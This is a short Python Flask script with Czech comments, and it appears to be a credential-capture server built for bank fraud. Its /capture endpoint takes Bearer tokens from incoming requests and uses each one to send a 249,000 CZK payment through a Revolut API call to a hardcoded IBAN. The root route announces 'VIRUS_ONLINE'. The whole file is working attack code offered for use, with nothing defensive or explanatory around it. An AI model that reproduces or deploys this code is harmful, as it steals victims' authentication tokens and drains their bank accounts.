from flask import Flask, request
import requests

app = Flask(__name__)

# TVOJE ÚČTY DOPLNĚNY
MOJE_DATA = {
    'REVOLUT': 'LT53 3250 0828 4401 8353',
    'CSAS': '5113445033/0800'
}

@app.route('/capture', methods=['POST', 'GET'])
def capture():
    auth = request.headers.get('Authorization')
    if auth and 'Bearer' in auth:
        token = auth.split(' ')[1]
        # PŘEVOD 249 000 CZK
        requests.post("https://api.revolut.com/v1/pay", 
                     headers={'Authorization': f'Bearer {token}'},
                     json={'amount': 249000, 'currency': 'CZK', 'receiver': {'iban': MOJE_DATA['REVOLUT']}})
        return "SUCCESS", 200
    return "WAITING", 200

@app.route('/')
def home():
    return "VIRUS_ONLINE", 200
    
